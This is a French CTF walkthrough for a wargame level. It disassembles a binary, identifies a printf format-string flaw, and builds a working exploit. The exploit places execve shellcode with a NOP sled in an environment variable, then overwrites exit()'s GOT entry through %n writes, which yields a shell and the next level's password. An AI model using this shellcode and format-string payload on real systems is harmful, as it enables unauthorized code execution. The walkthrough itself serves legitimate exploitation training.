# Analyse

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

## Binaire

`./level05`
```

```
`test`
```
test
```
## Gdb

`info function`
```asm
[...]
  0x08048444  main
[...]
```

`disas main`
```asm
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	push   edi
   0x08048448 <+4>:	push   ebx
   0x08048449 <+5>:	and    esp,0xfffffff0
   0x0804844c <+8>:	sub    esp,0x90                         ; 144 octets pour la stack
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0         ; int i @ esp+0x8c = 0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]                   ; buffer @ 0x+28
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>            ; fgets(buffer, 100, stdin);
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0         ; i = 0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>             ; jump <+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>             ; if buffer[i] <= 64: jump <+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>             ; if buffer[i] > 90:  jump <+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl                ; buffer[i] = buffer[i] ^ 32
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1         ; i++
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]         ; ebx = i
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff  ; int a @ esp+01xc = -1
   0x080484e6 <+162>:	mov    edx,eax                          ; edx = buffer
   0x080484e8 <+164>:	mov    eax,0x0                          ; eax = 0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]         ; ecx = a = -1
   0x080484f1 <+173>:	mov    edi,edx                          ; edi = buffer
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1                          ; eax = strlen(buffer)
   0x080484fc <+184>:	cmp    ebx,eax
   0x080484fe <+186>:	jb     0x8048487 <main+67>              ; if i < strlen(buffer):  jump <+67> (boucle)
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>           ; printf(buffer);
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>             ; exit(0);
End of assembler dump.
```

# Exploit

Le programme lit 100 octets sur stdin qu'il place dans un buffer, puis le parcourt et xor par 32 chaque octet entre 64 et 90 (ca revient à faire un to_lower).
Enfin, il utilise printf pour l'afficher, sans format string en premier argument (donc vulnérable car nous contrôlons le buffer).

On va pouvoir exploiter le printf pour écrire où nous le souhaitons, mais le programme ne return à aucun moment donc inutile de réécrire l'EIP.

L'objectif être de [remplacer son entrée dans la dans la Global Offset Table](https://axcheron.github.io/exploit-101-format-strings/) par [un shellcode](https://www.exploit-db.com/exploits/42428).

En mettant notre shellcode en input le xor va altérer son contenu donc on va devoir passer par une variable d'environnement pour le faire exécuter.
Pour plus d'informations sur les format string exploit et les override d'adresse dans la globale offset table, cf [RainFall/level3](https://github.com/Alhuin/rainfall/blob/main/level3/walkthrough.md) & [RainFall/level5](https://github.com/Alhuin/rainfall/blob/main/level5/walkthrough.md).

En utilisant le modifier %n de printf, on peut écrire à une adresse (habituellement celle d'une variable qui lui est fournie en paramètre) le nombre d'octets précédemment lus dans la format string.

Notre payload malicieux sera donc formatté comme suit:
- L'adresse GOT de exit() en little endian
- %[N]d     //  Padding de N octets (N étant la représentation en int de l'adresse de notre shellcode)
- "%[x]$n"  //  écrit N à l'adresse fournie en [x]ème paramètre (on veut pointer sur les 4 premiers octets de notre payload)

`export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')`

`gdb level5`
```
(gdb) b * main
Breakpoint 1 at 0x8048444
(gdb) r
Starting program: /home/users/level05/level05
(gdb) x/140s environ
[...]
0xffffd4bc: SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\2
[...]
```
- On a l'adresse de notre varibale d'environnement : 0xffffd4bc, mais on va prendre une adresse un peu plus loin pour être sur de tomber dans la nopsled: 0xffffd64c.

`python -c 'print "aaaa " + "%08x " * 20' | ./level05`
```
aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6bf ffffd6be 00000000 ffffffff ffffd744 f7fdb000 61616161 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830
```
- printf() commence à lire le début de la format string au `10eme paramètre`.

`objdump -R level05`
```
level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
- l'adresse d'exit dans la global offset table est `0x80497e0`

On veut donc écire 0xffffd64c à l'adresse 0x80497e0 avec %n, mais 0xffffd64c est trop grand pour tenir dans un seul int, on va donc écrire ce nombre en deux fois, sur deux short ints (2 octets): d64c = 54860 à 0x80497e0 et ffff = 65535 à 0x80497e2.

Notre payload final sera:
- '\xe0\x97\x04\x08'    // l'adresse GOT de exit()
- '\xe2\x97\x04\x08'    // l'adresse GOT de exit() + 2 octets
- '%54852d'             // 54860 - les 8 octets des deux adresses précédentes = 54852
- '%10$n'              // écrit la première moitié de l'adresse du shellcode à l'adresse GOT de exit()
- '%10675d'             // 65535 - ce qu'on a déjà écrit (54860) = 10675
- '%11$n'             // écrit la deuxième moitié de l'adresse du shellcode à l'adresse GOT de exit() + 2

`(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54852d" + "%10$n" + "%10675d" + "%11$n"';cat) | ./level05`
```
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
